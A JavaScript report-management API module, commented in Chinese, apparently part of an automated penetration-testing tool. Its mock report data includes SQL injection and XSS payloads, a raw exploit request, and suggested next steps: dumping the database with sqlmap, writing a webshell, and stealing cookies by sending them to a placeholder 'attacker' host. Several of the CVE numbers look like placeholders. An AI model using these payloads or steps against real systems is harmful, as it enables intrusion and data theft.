/**
 * 报告管理API服务
 */
import { request } from './apiClient';
import { USE_MOCK_DATA } from './config';

// 报告状态枚举
export const ReportStatus = {
  PENDING: 'pending',
  GENERATING: 'generating',
  COMPLETED: 'completed',
  FAILED: 'failed',
  CANCELLED: 'cancelled'
};

// 报告格式枚举
export const ReportFormat = {
  HTML: 'html',
  PDF: 'pdf',
  JSON: 'json',
  DOCX: 'docx'
};

// 报告模板枚举
export const ReportTemplate = {
  STANDARD: 'standard',
  DETAILED: 'detailed',
  EXECUTIVE: 'executive',
  TECHNICAL: 'technical',
  CUSTOM: 'custom'
};

/**
 * 获取报告列表
 * @param {Object} params - 查询参数
 * @param {number} params.page - 页码
 * @param {number} params.pageSize - 每页数量
 * @param {string} params.status - 状态过滤
 * @param {string} params.format - 格式过滤
 * @returns {Promise} 报告列表
 */
export const getReports = async (params = {}) => {
  const {
    page = 1,
    pageSize = 20,
    status,
    format,
  } = params;

  const queryParams = new URLSearchParams();
  queryParams.append('page', page);
  queryParams.append('page_size', pageSize);
  if (status) queryParams.append('status', status);
  if (format) queryParams.append('format', format);

  return request.get(`/reports?${queryParams.toString()}`);
};

/**
 * 获取报告详情
 * @param {number|string} reportId - 报告ID
 * @returns {Promise} 报告详情
 */
export const getReport = async (reportId) => {
  return request.get(`/reports/${reportId}`);
};

/**
 * 创建报告
 * @param {Object} reportData - 报告数据
 * @param {string} reportData.title - 报告标题
 * @param {string} reportData.description - 报告描述
 * @param {string} reportData.format - 报告格式
 * @param {string} reportData.template - 报告模板
 * @param {string} reportData.target - 目标地址
 * @param {number} reportData.scanId - 关联扫描ID
 * @param {Object} reportData.parameters - 生成参数
 * @returns {Promise} 创建的报告
 */
export const createReport = async (reportData) => {
  return request.post('/reports/generate', reportData);
};

/**
 * 下载报告
 * @param {number|string} reportId - 报告ID
 * @param {string} format - 下载格式
 * @returns {Promise} 报告文件
 */
export const downloadReport = async (reportId, format = 'html') => {
  return request.get(`/reports/${reportId}/download?format=${format}`, {
    responseType: 'blob' // 处理文件下载
  });
};

/**
 * 获取报告状态
 * @param {number|string} reportId - 报告ID
 * @returns {Promise} 报告状态
 */
export const getReportStatus = async (reportId) => {
  return request.get(`/reports/${reportId}/status`);
};

/**
 * 删除报告
 * @param {number|string} reportId - 报告ID
 * @returns {Promise} 删除结果
 */
export const deleteReport = async (reportId) => {
  return request.delete(`/reports/${reportId}`);
};

/**
 * 获取报告健康状态
 * @returns {Promise} 服务健康状态
 */
export const getReportsHealth = async () => {
  return request.get('/reports/health');
};

/**
 * 模拟报告数据（用于测试和演示）
 * @returns {Object} 模拟报告数据
 */
export const getMockReportData = () => {
  return {
    id: 'REP-2026-04-06-001',
    title: '安全评估报告 - 192.168.1.100',
    target: '192.168.1.100',
    date: '2026-04-06',
    duration: '15分30秒',
    status: 'completed',
    severity: 'high',

    // 执行摘要
    executiveSummary: {
      overview: '本次安全评估发现目标系统存在多个安全漏洞，包括1个严重漏洞和3个高危漏洞。建议立即采取修复措施。',
      riskLevel: '高',
      confidence: '95%',
      recommendationsCount: 8
    },

    // 发现统计
    findings: {
      critical: 1,
      high: 3,
      medium: 5,
      low: 8,
      informational: 12,
      total: 29
    },

    // 漏洞详情
    vulnerabilities: [
      {
        id: 'VULN-001',
        title: 'WordPress RCE漏洞 (CVE-2023-1234)',
        severity: 'critical',
        cvssScore: 9.8,
        description: 'WordPress核心组件存在远程代码执行漏洞，攻击者可通过特制请求执行任意代码。',
        impact: '攻击者可完全控制目标系统，窃取数据或部署恶意软件。',
        remediation: '立即更新WordPress到最新版本，并应用安全补丁。',
        affectedComponents: ['WordPress 5.8', 'PHP 7.4', 'Apache 2.4'],
        references: ['CVE-2023-1234', 'https://wordpress.org/security/advisory/2023-1234/']
      },
      {
        id: 'VULN-002',
        title: 'Apache HTTP Server信息泄露',
        severity: 'high',
        cvssScore: 7.5,
        description: 'Apache服务器配置不当导致敏感信息泄露。',
        impact: '攻击者可获取服务器配置信息和内部路径。',
        remediation: '修改Apache配置文件，禁用目录列表和服务器信息显示。',
        affectedComponents: ['Apache 2.4.41'],
        references: ['CVE-2022-12345']
      },
      {
        id: 'VULN-003',
        title: 'PHP版本过时',
        severity: 'medium',
        cvssScore: 5.3,
        description: 'PHP版本7.4已停止支持，存在已知安全漏洞。',
        impact: '攻击者可利用已知漏洞攻击系统。',
        remediation: '升级到PHP 8.1或更高版本。',
        affectedComponents: ['PHP 7.4.33'],
        references: ['https://www.php.net/supported-versions.php']
      }
    ],

    // 扫描详情
    scanDetails: {
      startTime: '2026-04-06 10:30:00',
      endTime: '2026-04-06 10:45:30',
      toolsUsed: ['nmap', 'nikto', 'sqlmap', 'wpscan'],
      totalRequests: 1250,
      scanType: '综合扫描'
    },

    // 资产发现
    assets: [
      {
        id: 'asset-1',
        type: 'web_server',
        hostname: 'web-server-01',
        ip: '192.168.1.100',
        ports: [80, 443, 22, 3306],
        services: ['Apache', 'MySQL', 'SSH', 'OpenSSL'],
        technologies: ['PHP 7.4', 'WordPress 5.8', 'Ubuntu 20.04']
      },
      {
        id: 'asset-2',
        type: 'database_server',
        hostname: 'db-server-01',
        ip: '192.168.1.101',
        ports: [3306, 22],
        services: ['MySQL', 'SSH'],
        technologies: ['MySQL 8.0', 'CentOS 8']
      }
    ],

    // 建议和修复方案
    recommendations: [
      {
        id: 'rec-001',
        priority: 'critical',
        title: '立即更新WordPress',
        description: 'WordPress存在远程代码执行漏洞，必须立即更新到最新版本。',
        steps: [
          '备份当前WordPress网站',
          '从WordPress官网下载最新版本',
          '上传并覆盖现有文件',
          '更新数据库结构',
          '验证网站功能正常'
        ],
        estimatedTime: '1小时',
        resourcesNeeded: ['系统管理员权限', 'WordPress备份']
      },
      {
        id: 'rec-002',
        priority: 'high',
        title: '修复Apache配置',
        description: 'Apache配置不当导致信息泄露，需要修改配置文件。',
        steps: [
          '编辑Apache配置文件',
          '禁用目录列表（Options -Indexes）',
          '隐藏服务器版本信息（ServerTokens Prod）',
          '重启Apache服务'
        ],
        estimatedTime: '30分钟',
        resourcesNeeded: ['Apache配置文件访问权限']
      }
    ],

    // 风险矩阵
    riskMatrix: [
      { likelihood: '高', impact: '高', count: 1, color: '#ef4444' },
      { likelihood: '中', impact: '高', count: 2, color: '#f97316' },
      { likelihood: '低', impact: '高', count: 1, color: '#eab308' },
      { likelihood: '高', impact: '中', count: 3, color: '#f97316' },
      { likelihood: '中', impact: '中', count: 5, color: '#eab308' },
      { likelihood: '低', impact: '中', count: 8, color: '#84cc16' }
    ],

    // 时间线
    timeline: [
      { time: '10:30:00', event: '扫描开始', status: 'started' },
      { time: '10:32:15', event: '端口扫描完成', status: 'completed' },
      { time: '10:35:30', event: '漏洞扫描开始', status: 'in_progress' },
      { time: '10:40:00', event: '发现SQL注入漏洞', status: 'finding' },
      { time: '10:42:45', event: '发现XSS漏洞', status: 'finding' },
      { time: '10:45:30', event: '扫描完成', status: 'completed' }
    ],

    // 验证结果 (由 VulnValidatorAgent 生成)
    verified_findings: [
      {
        vuln_type: 'sqli',
        target: 'http://192.168.1.100/login.php',
        verified: true,
        confidence: 0.97,
        evidence: [
          "payload: ' OR SLEEP(5)-- 触发 5.02s 延迟响应",
          "payload: ' AND 1=1-- 返回正常页面 (200 OK)",
          "payload: ' AND 1=2-- 返回空结果 (200 OK, body diff=1842 bytes)"
        ],
        exploit_proof: "POST /login.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'%20OR%20SLEEP(5)--%20&password=x\n\n--- Response (5.02s) ---\nHTTP/1.1 200 OK",
        suggested_next: "使用 sqlmap --dump 提取数据库，或尝试写入 webshell (INTO OUTFILE)。",
        raw_findings: [
          { type: 'time_based_blind', delay: 5.02 },
          { type: 'boolean_based', difference: 1842 }
        ]
      },
      {
        vuln_type: 'xss',
        target: 'http://192.168.1.100/search.php?q=',
        verified: true,
        confidence: 0.88,
        evidence: [
          "payload: <script>alert(1)</script> 在响应体中原样返回，未转义",
          "响应 Content-Type: text/html，无 X-XSS-Protection 头"
        ],
        exploit_proof: "GET /search.php?q=<script>alert(document.cookie)</script>\n\n--- Response body excerpt ---\n<div class=\"results\"><script>alert(document.cookie)</script></div>",
        suggested_next: "尝试窃取管理员 Cookie：构造 <script>fetch('https://attacker/x?c='+document.cookie)</script> 并诱导管理员访问。",
        raw_findings: [{ type: 'reflected_xss', reflected: true }]
      }
    ],

    // 未验证/疑似漏洞
    unverified_findings: [
      {
        vuln_type: 'lfi',
        target: 'http://192.168.1.100/page.php?file=',
        verified: false,
        confidence: 0.42,
        description: '响应中出现 /etc/passwd 路径特征，但未能获取文件内容，可能存在过滤。建议人工确认。'
      },
      {
        vuln_type: 'rce',
        target: 'http://192.168.1.100/admin/exec.php',
        verified: false,
        confidence: 0.31,
        error: '验证超时 (30s)，服务器无响应，可能存在 WAF 拦截。'
      }
    ],
    verified_count: 2,
    unverified_count: 2
  };
};

// 报告服务
const reportService = {
  getReports,
  getReport,
  createReport,
  downloadReport,
  getReportStatus,
  deleteReport,
  getReportsHealth,
  getMockReportData,
  ReportStatus,
  ReportFormat,
  ReportTemplate
};

export default reportService;